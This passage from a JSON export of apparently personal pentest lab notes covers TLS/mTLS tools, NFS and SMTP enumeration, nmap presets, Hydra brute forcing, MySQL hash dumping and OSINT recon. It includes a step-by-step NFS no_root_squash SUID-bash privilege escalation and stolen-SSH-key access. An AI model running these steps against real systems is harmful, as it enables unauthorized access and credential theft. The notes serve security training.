    "content": "# 🔐 TLS / mTLS & NETWORK SOCKETS — CHEATSHEET\n\n> 🧠 **Core idea:**  \n> **Plain TCP = шууд ярилцана**  \n> **TLS = яриагаа шифрлэнэ**  \n> **mTLS = хоёр тал хоёулаа identity-гээ батална**\n\n---\n\n# 1️⃣ 🌐 TLS vs mTLS\n\n## Standard HTTPS\n\n```text\n👤 CLIENT\n   │\n   │ TLS handshake\n   ▼\n🌐 SERVER\n   │\n   └── 📜 Server Certificate\n```\n\n### Client шалгана:\n\n> “Би жинхэнэ server-тэй холбогдож байна уу?”\n\n```text\nClient ✅ verifies Server\nServer ❌ does not necessarily require Client Cert\n```\n\n---\n\n## Mutual TLS (mTLS)\n\n```text\n👤 CLIENT\n   │\n   │ 📜 Client Certificate\n   ▼\n🌐 SERVER\n   │\n   │ 📜 Server Certificate\n   ▼\n🤝 BOTH VERIFY EACH OTHER\n```\n\n### Memory:\n\n> **TLS = Server proves identity**  \n> **mTLS = Server + Client prove identity**\n\n---\n\n# 2️⃣ 🪪 IMPORTANT FILES\n\n|File|Meaning|🧠 Think|\n|---|---|---|\n|`client.key`|Private key|🔑 SECRET|\n|`client.crt` / `.pem`|Client certificate|🪪 ID CARD|\n|`ca.crt`|CA certificate|🏛️ TRUST|\n\n### Хамгийн чухал:\n\n```text\n.crt → \"Би хэн бэ?\"\n.key → \"Би үнэхээр тэр хүн гэдгээ батал.\"\nCA   → \"Энэ identity-д итгэж болно.\"\n```\n\n> ⚠️ **Private key-г secret гэж үз. Бусадтай бүү хуваалц.**\n\n---\n\n# 3️⃣ 📡 PLAIN TCP SOCKET\n\nPlain socket-д TLS байхгүй.\n\n```bash\nnc <TARGET_IP> <PORT>\n```\n\n### Mental model\n\n```text\n👤 YOU ─────────────► 🌐 SERVER\n        plain TCP\n```\n\n### `nc` =\n\n> **“Шууд утас залга.”**\n\nService banner, prompt, text protocol байвал CLI-ээр харилцаж болно.\n\n---\n\n# 4️⃣ 🔐 TLS-WRAPPED SOCKET\n\nTLS-тэй service рүү plain `nc` хангалтгүй байж болно.\n\n```bash\nopenssl s_client -connect <TARGET_IP>:<PORT> -quiet\n```\n\n### Mental model\n\n```text\n👤 YOU\n  ↓\nopenssl\n  ↓\n🤝 TLS handshake\n  ↓\n🌐 SERVER\n```\n\n### Memory:\n\n```text\nPlain TCP → nc\nTLS TCP   → openssl s_client\n```\n\n---\n\n# 5️⃣ 🪪 mTLS WITH `curl`\n\nWeb/API service:\n\n```bash\ncurl \\\n  --cert client.crt \\\n  --key client.key \\\n  https://<TARGET_IP>:<PORT>/\n```\n\n### Meaning\n\n```text\n--cert → 🪪 Client certificate\n--key  → 🔑 Client private key\n```\n\n---\n\n## ⚠️ Self-signed / untrusted server certificate\n\nLab орчинд:\n\n```bash\ncurl -k \\\n  --cert client.crt \\\n  --key client.key \\\n  https://<TARGET_IP>:<PORT>/\n```\n\n### `-k`\n\n> **Server certificate verification-ийг алгасна.**\n\n⚠️ `-k` нь **client certificate authentication-ийг устгахгүй**.\n\n---\n\n# 6️⃣ 🔬 mTLS WITH `openssl`\n\nCustom TLS service:\n\n```bash\nopenssl s_client \\\n  -connect <TARGET_IP>:<PORT> \\\n  -cert client.crt \\\n  -key client.key \\\n  -quiet\n```\n\n### Flow\n\n```text\n📜 client.crt\n      +\n🔑 client.key\n      ↓\n🤝 TLS handshake\n      ↓\n✅ Client authenticated\n      ↓\n🔐 Protected service\n```\n\n---\n\n# 7️⃣ 🌉 `socat` — TLS BRIDGE\n\nЗарим tool client certificate ашиглахад тохиромжгүй.\n\n`socat` bridge болгож болно:\n\n```bash\nsocat \\\nTCP-LISTEN:8080,fork,reuseaddr \\\nOPENSSL:<TARGET_IP>:<PORT>,cert=client.crt,key=client.key,verify=0\n```\n\n### Mental model\n\n```text\nYOUR TOOL\n    │\n    │ Plain TCP\n    ▼\n🧰 socat\n    │\n    │ TLS + Client Cert\n    ▼\n🌐 mTLS SERVER\n```\n\n> 🧠 **socat = “Хоёр өөр хэлээр ярьдаг хоёр талыг холбох bridge.”**\n\n---\n\n# 8️⃣ 🔍 HOW TO DECIDE WHICH TOOL\n\n```text\nIs service plain TCP?\n        │\n       YES\n        ↓\n       nc\n\n        NO\n        ↓\nIs service TLS?\n        │\n       YES\n        ↓\nopenssl s_client\n```\n\nХэрэв mTLS required:\n\n```text\nTLS\n ↓\nNeed client cert?\n ↓\nYES\n ↓\n-cert client.crt\n-key client.key\n```\n\n---\n\n# 9️⃣ 🗺️ RECON WORKFLOW\n\n```text\n🔎 PORT SCAN\n      ↓\n⚙️ IDENTIFY SERVICE\n      ↓\n📡 Plain TCP?\n   │\n   ├── YES → nc\n   │\n   └── NO\n        ↓\n     🔐 TLS?\n        ↓\n   openssl s_client\n        ↓\n🪪 Client certificate required?\n        ↓\n📜 client.crt\n+\n🔑 client.key\n        ↓\n✅ mTLS authentication\n        ↓\n🔐 Protected service\n```\n\n---\n\n# 🔟 🧠 QUICK COMMAND TABLE\n\n| Goal                              | Command                                                                         |\n| --------------------------------- | ------------------------------------------------------------------------------- |\n| Plain TCP                         | `nc <IP> <PORT>`                                                                |\n| TLS socket                        | `openssl s_client -connect <IP>:<PORT> -quiet`                                  |\n| HTTPS + mTLS                      | `curl --cert client.crt --key client.key https://<IP>:<PORT>/`                  |\n| HTTPS + lab/untrusted server cert | `curl -k --cert client.crt --key client.key https://<IP>:<PORT>/`               |\n| TLS + client cert                 | `openssl s_client -connect <IP>:<PORT> -cert client.crt -key client.key -quiet` |\n| Local TLS bridge                  | `socat TCP-LISTEN:8080,... OPENSSL:...`                                         |\n\n---\n\n# 🧠 11️⃣ THE 5 THINGS TO REMEMBER\n\n```text\n🚪 PORT\n   ↓\n📡 SOCKET\n   ↓\n🔐 TLS?\n   ↓\n🪪 CLIENT CERT?\n   ↓\n🔑 PRIVATE KEY?\n```\n\n### Golden memory\n\n> **`nc` = plain**\n\n> **`openssl s_client` = TLS**\n\n> **`curl --cert --key` = HTTPS + mTLS**\n\n> **`.crt` = identity**\n\n> **`.key` = secret proof**\n\n> **CA = trust**\n\n> **mTLS = BOTH SIDES IDENTIFY**",
    "sourcePath": "NETWORK/gojo's domain/cheatshit.md"
  },
  {
    "id": 10030,
    "title": "Networking 2 task 3",
    "room": "NETWORK/gojo's domain",
    "source": "Cyber",
    "stage": "Live Fire",
    "tags": [
      "ks-import",
      "network",
      "gojos-domain",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: NETWORK/gojo's domain/Networking 2 task 3.md",
    "content": "📂 ADD THIS TO YOUR OBSIDIAN VAULT\n[[task 5,6]]\n\n\nTitle: [[NFS (Network File System) Enumeration]]\nTags: #Networking #NFS #Reconnaissance #Exploitation\n\n    **Ports: ==Port 111==** (rpcbind / portmapper) and ==Port 2049== (NFS).\n\n    The Recon Weapon: ==showmount -e [TARGET_IP]== (Lists all exported directories).\n\n    The Mount Weapon: ==sudo mount -t nfs [TARGET_IP]:[SHARE_PATH] [LOCAL_MOUNT_POINT] -nolock==\n\n        -t nfs = Specifies the filesystem type is NFS.\n\n        -nolock = Disables file locking (prevents connection hangs).\n\n    The SSH Pivot: If a home directory is exposed, mount it, extract the ==id_rsa== private key, restrict permissions (==chmod 600 id_rsa==), and SSH into the box: ==ssh -i id_rsa user@[TARGET_IP]==.\n\n\n`nmap` -sS -sV -A -p- -Pn -T4 10.49.161.146\n\n\n\n       ",
    "sourcePath": "NETWORK/gojo's domain/Networking 2 task 3.md"
  },
  {
    "id": 10031,
    "title": "powerful commands",
    "room": "NETWORK/gojo's domain",
    "source": "Cyber",
    "stage": "Live Fire",
    "tags": [
      "ks-import",
      "network",
      "gojos-domain",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: NETWORK/gojo's domain/powerful commands.md",
    "content": "[[task 5,6]]`nmap -sS -sV -sC -A -p- -Pn -T4 --min-rate 1000 ip`\n### 1. **Best Daily Driver Command** (Recommended)\n\nBash\n\n```\nnmap -sS -sV -sC -A -O -p- -Pn -T3 --min-rate 300 TARGET_IP\n```\n\n**Why this is better for daily use:**\n\n- -T3 → Balanced speed (not too slow, not too loud)\n- --min-rate 300 → Fast enough but much safer than 1000\n- -sC → Runs useful scripts\n- -A → OS detection + version + traceroute\n- -O → OS fingerprinting\n- -sS → Stealthy scan\n\n---\n\n### 2. **Most Powerful Balanced Command** (My Personal Favorite)\n\nBash\n\n```\nnmap -sS -sV -sC -A -O -p- -Pn -T4 --min-rate 500 -vv TARGET_IP\n```\n\n**Slightly more aggressive but still good for daily use.**\n\n---\n\n### 3. **Safe & Smart Daily Command** (Best for Beginners / Daily Recon)\n\nBash\n\n```\nnmap -sS -sV -sC -A -p- -Pn -T3 TARGET_IP\n```\n\nThis is the one I recommend you **save and use most of the time**.\n\n---\n\n### 4. **Ultra Powerful + Script Heavy** (When you want maximum info)\n\nBash\n\n```\nnmap -sS -sV -sC -A -O --script vuln -p- -Pn -T3 --min-rate 400 TARGET_IP\n```\n\n---\n\n### Quick Comparison:\n\n|Command|Speed|Noise Level|Best For|\n|---|---|---|---|\n|-T4 --min-rate 1000|Very Fast|High|TryHackMe / CTF only|\n|-T3 --min-rate 300|Good|Medium|**Daily Use** (Recommended)|\n|-T4 --min-rate 500|Fast|Medium-High|Regular pentesting|\n|Without min-rate|Slow|Low|Very stealthy|\n\n---\n\n**My Recommendation for You:**\n\n**Save this as your daily powerful command:**\n\nBash\n\n```\nnmap -sS -sV -sC -A -O -p- -Pn -T3 --min-rate 400 TARGET_IP\n```",
    "sourcePath": "NETWORK/gojo's domain/powerful commands.md"
  },
  {
    "id": 10032,
    "title": "task 4",
    "room": "NETWORK/gojo's domain",
    "source": "Cyber",
    "stage": "Live Fire",
    "tags": [
      "ks-import",
      "network",
      "gojos-domain",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: NETWORK/gojo's domain/task 4.md",
    "content": "📂 ADD THIS TO YOUR OBSIDIAN VAULT\n[[Networking 2 task 3]]\nTitle[[: NFS Privilege Escalation (no_root_squash)]]\nTags: #Linux #PrivEsc #NFS #SUID #ConfigurationError\n\n    The Vulnerability: The NFS share is configured with the no_root_squash flag in /etc/exports. This allows a remote client with local root privileges to write files to the share while maintaining root ownership on the host.\n\n    The SUID Bit (-rws------): Set User ID. Allows an executable to run with the privileges of its owner.\n\n    The Exploit Process:\n\n        Mount the NFS share on your attacking machine (Kali).\n\n        Copy a compatible bash binary into the mount point.\n\n        As local root (on Kali), set the owner to root: ==chown root bash==.\n\n        Set the SUID bit: ==chmod +s bash== (Verify permissions show rws).\n\n        On the target machine (via low-privilege shell), execute: ==./bash -p==.\n\n    The -p Flag: Tells bash to preserve the effective user ID (eUID) of root instead of dropping it back to the real user ID of the low-privilege user.\n\n\n\nsudo chown root:root bash\nsudo chmod +s bash",
    "sourcePath": "NETWORK/gojo's domain/task 4.md"
  },
  {
    "id": 10033,
    "title": "task 5,6",
    "room": "NETWORK/gojo's domain",
    "source": "Cyber",
    "stage": "Live Fire",
    "tags": [
      "ks-import",
      "network",
      "gojos-domain",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "2 min",
    "date": "KS import",
    "excerpt": "KS source: NETWORK/gojo's domain/task 5,6.md",
    "content": "📂 ADD THIS TO YOUR OBSIDIAN VAULT\n\nTitle:[[ Mail Protocols - SMTP vs. POP/IMAP]]\nTags: #Networking #Protocols #SMTP #IMAP #POP\n\n0\n> `SMTP`\n> ## (Push): Simple Mail Transfer Protocol [1]. Handles outgoing mail [1]. Default port is ==Port 25== [1].\n\n> `%% IMAP %%`\n> (Pull/Sync): Synchronizes the local inbox with the mail server [1]. Keeps messages on the server so changes persist across multiple devices [1].\n\n> `POP`\n> (Pull/Delete): Downloads messages to the local client and deletes them from the server [1].\n\n> `SMTP`\n> Queue: Temporary storage on the mail server used to hold emails that cannot be immediately delivered to the recipient due to network or server outages [1].\n\n\n📂 ADD THIS TO YOUR OBSIDIAN VAULT\n\nTitle: [[Metasploit SMTP Enumeration]]\nTags: #Metasploit #SMTP #Enumeration #Reconnaissance\n\n    Metasploit Console Launch: ==msfconsole== [2].\n\n> `Auxiliary Scanner (Version):`\n>  ### - **==auxiliary/scanner/smtp/smtp_version==** [2]. **Grabs** the SMTP banner to identify the Mail Transfer Agent (MTA) [2].\n\n> `Auxiliary Scanner (User Enum):` \n> - # - ==auxiliary/scanner/smtp/smtp_enum== [2]. Automates the transmission of ==VRFY== commands against a dictionary list to harvest valid system accounts [1, 2].\n\n> `Target IP Variable`: \n> In Metasploit, the target host is always set using the ==RHOSTS== variable.\n\n> `Wordlist` Variable:\\\n>  In Metasploit, the path to a username list is set using the ==USER_FILE== variable.\n\n\n📂 ADD THIS TO YOUR OBSIDIAN VAULT\n\n**Title:**[[Brute-Forcing Network Logins ff(Hydra)]]\nTags: #Attacking #Hydra #SSH #BruteForce\n\n> The Concept: Automating authentication attempts against network services (SSH, FTP, HTTP) using a wordlist.\n\n**`The` Weapon: ==hydra -t 16 -l [USER] -P [WORDLIST] -vV [IP] [PROTOCOL]==[3]**\n\n> %% ``-t 16 = Parallel execution threads[3]. High speed, high detection risk.\n> \n>    `` -l [user] = The static target username[3].\n> \n> ``-P [file] = The dictionary file (usually rockyou.txt)[3].\n> \n> ``-vV = Show all attempts in real-time[3]. %%\n\nMitigation: To defend against this, Security Engineers implement Fail2Ban (bans IPs after 3 failed login attempts) or enforce Key-Based Authentication instead of passwords.",
    "sourcePath": "NETWORK/gojo's domain/task 5,6.md"
  },
  {
    "id": 10034,
    "title": "task 8,9,10",
    "room": "NETWORK/gojo's domain",
    "source": "Cyber",
    "stage": "Live Fire",
    "tags": [
      "ks-import",
      "network",
      "gojos-domain",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "2 min",
    "date": "KS import",
    "excerpt": "KS source: NETWORK/gojo's domain/task 8,9,10.md",
    "content": "📂 ADD THIS TO YOUR OBSIDIAN VAULT\n[[task 5,6]]\nTitle: [[RDBMS & MySQL Architecture]]\nTags: #Databases #MySQL #SQL #Protocols\n\n> `RDBMS:`\n>  Relational Database Management System. Organizes data into tables connected by keys.\n\n> `The Protocol & Port:` \n> Communicates using the MySQL protocol over **==Port 3306==.**\n\n> `SQL (Structured Query Language):` \n> The syntax used to query, edit, and manage database records.\n\n> `The LAMP Stack`:\n>  A common web server architecture consisting of Linux (OS), Apache (Web Server), MySQL (Database), and PHP/Python (Backend Language).\n\n> `Hacker Application:`\n>  Attackers target Port 3306 to harvest credentials, exploit SQL Injection (SQLi) vulnerabilities, or abuse database privileges to write web shells to the disk.\n\n\n📂 ADD THIS TO YOUR OBSIDIAN VAULT\n\nTitle: [[MySQL Command-Line Client & Metasploit]]\nTags: #Databases #MySQL #Metasploit #Exploitation\n\n> `Manual Client Connection:`\n>  `mysql -h [IP] -u [USER] -p` (Prompts for password).\n\n> Plaintext Bypass: Append ==--ssl-mode=DISABLED== to bypass modern TLS/SSL handshake requirements on legacy/vulnerable systems.\n\n>    Metasploit SQL Query Module: ==auxiliary/admin/mysql/mysql_sql==\n\n>     Allows direct execution of SQL queries against an authenticated target.\n\n`Essential SQL Commands:`\n\n`==select version();==` (Identifies SQL software version).\n\n`==show databases;==` (Lists all available databases on the server).\n\n\n\n📂 ADD THIS TO YOUR OBSIDIAN VAULT\n\nTitle: [[Schema Dumping & Offline Hash Cracking]]\n\nTags: #Databases #MySQL #HashCracking #JohnTheRipper #PrivilegeEscalation\n\n> `Database Schema:` \n> **The** structural blueprint of a database, defining the tables, columns, and data relationships [2].\n\n> `Schema Dumping Module:` \n> ==mysql_schemadump== (Extracts the database structure) [2].\n\n> `Hash Dumping Module`:\n>  ==mysql_hashdump== (Extracts user password hashes from system tables) [2].\n\n> `Hash Cracking (One-Way Functions):` Hashes cannot be decrypted. Cracking is achieved by hashing dictionary words (rockyou.txt) and comparing the outputs until a match is found [2].\n\n> `John the Ripper:`\n>  A command-line offline password cracking utility used to automate dictionary attacks against recovered hashes [2].\n\n> `Password Reuse:` \n> A critical vulnerability where users share credentials across multiple services (e.g., Database and SSH), allowing attackers to move laterally across the system [2].",
    "sourcePath": "NETWORK/gojo's domain/task 8,9,10.md"
  },
  {
    "id": 10035,
    "title": "cheat",
    "room": "PASSIVE recon",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "passive-recon",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "69 min",
    "date": "KS import",
    "excerpt": "KS source: PASSIVE recon/cheat.md",
    "content": "📂 MASTER FIELD MANUAL: PASSIVE RECONNAISSANCE (OSINT)\n\nTags: #Reconnaissance #OSINT #PassiveRecon #DNS #WHOIS #RDAP #Shodan\ncode Code\n\n[Phase 1: Domain & Identity] ──> [Phase 2: DNS & Subdomains] ──> [Phase 3: Global Infrastructure]\n      (WHOIS / RDAP)                 (dig / crt.sh / Dumpster)               (Shodan / Censys)\n\n```\n==**1. Core Rule: Active vs. Passive**==\n```\n\n>     ==**Active Reconnaissance:**==\n>      Packets hit the target directly (==nmap==, ==ping==). Leaves IP entries in firewalls, WAFs, and SIEM logs.\n\n>     ==**Passive Reconnaissance:**== \n>     Queries third-party aggregators and public databases. Zero direct packets sent to the target. Completely invisible to the target's SOC.\n\n> **==2. Domain & Ownership Intel (WHOIS vs. RDAP)==**\n\n    WHOIS (==TCP Port 43==): Plaintext ASCII query protocol. Output varies by registrar.\n\n>         ==**Query:**== \n```\n>         ==whois target.com==\n```\n> \n>         ==**Filtered:**== \n```\n>         ==whois target.com | grep -iE \"Registrar:|Name Server:|Creation Date|Expiration Date\"==\n```\n> \n>     RDAP (==HTTPS Port 443==): Modern standard. RESTful, encrypted, machine-readable JSON.\n> \n>         ==**Query with jq:**==\n```\n>          ==curl -s https://rdap.verisign.com/com/v1/domain/target.com | jq .==\n```\n> \n>         ==**Extract Nameservers:**==\n```\n>          ==curl -s https://rdap.verisign.com/com/v1/domain/target.com | jq '.nameservers'==\n```\n\n3. **==DNS Interrogation (dig on UDP/TCP Port 53)**==\n\n>     ==**Stealth Query via Public Resolver:**==\n```\n    ==dig @1.1.1.1 target.com [RECORD_TYPE]==\n```\n\n>     ==**(Queries Cloudflare instead of target's nameserver; preserves zero footprint).**==\n\n>     ==**Script-Friendly Output:**==\n```\n    ==dig +short target.com [RECORD_TYPE]==\n```\n\n    Record Types & Exploitation Angles:\n\n>         ==**==A== (IPv4) / ==AAAA== (IPv6): Compare both. IPv6 addresses frequently lack the WAF/firewall rules applied to IPv4.**==\n> \n>         ==**CNAME (Canonical Name / Alias): Points a subdomain to an external service (e.g., GitHub, S3 bucket). If the external service is deleted but the CNAME remains, execute a ==**Subdomain Takeover.==**\n> \n>         **==MX (Mail Exchange): Lower priority number = primary server. Secondary/backup mail servers (e.g., priority 10 or 20) are often unpatched.==**\n> \n>         **==TXT: Contains email anti-spoofing policies (SPF, DKIM, DMARC) and verification tokens. If DMARC is p=none or SPF is loose (~all), email spoofing/phishing is viable.==**\n> \n>     **==TTL (Time To Live): Indicates DNS cache duration in seconds. Unusually low TTLs (e.g., 60s) signal live infrastructure migration.**==\n\n> ==**4. Subdomain Discovery (Certificate Transparency & Aggregation)**==\n\n>     ==**Certificate Transparency (==crt.sh==):**==\n\n        Public, append-only cryptographic ledger of all SSL/TLS certificates issued by CAs.1\n\n>         ==**Web Query:**==\n```\n         ==https://crt.sh/?q=%.target.com== (Wildcard search).\n```\n\n>         ==**CLI Query (JSON):**== \n```\n        ==curl -s \"https://crt.sh/?q=%.target.com&output=json\" | jq -r '.[].name_value' | sort -u==\n```\n\n        Value: Exposes hidden staging (dev.), internal portals (admin.), and legacy servers that requested HTTPS certificates.\n\n>     ==**DNSDumpster (dnsdumpster.com):**==\n\n        Scrapes search engine caches and historical DNS datasets.\n\n        Maps relational graphs (Root Domain -> MX -> Nameservers -> Subdomains -> ASNs/Hosting Providers).\n\n> 5. **==Internet-Wide Asset Discovery (Shodan / Censys)**==\n\n    Mechanism: Indexes the IPv4 space 24/7 via automated port scanning and Banner Grabbing (capturing service response headers).\n\n>     ==**Key Search Operators:==**\n> \n>         **==hostname:\"target.com\" (Finds servers linked to domain).==**\n> \n>         **==org:\"Target Corporation\" (Filters by registered enterprise IP space).==**\n> \n>         **==product:\"Apache\" port:80 (Finds specific technologies).==**\n> \n>         **==country:\"US\" (Geographic filtering).**==\n\n    Critical Findings:\n\n        Recursion: enabled on DNS (Port 53): Vulnerable to cache poisoning and amplification DDoS.\n\n        Exposed databases (Port 3306 MySQL, Port 6379 Redis, Port 27017 MongoDB) with default/empty credentials.\n>         ![](data:image/png;base64,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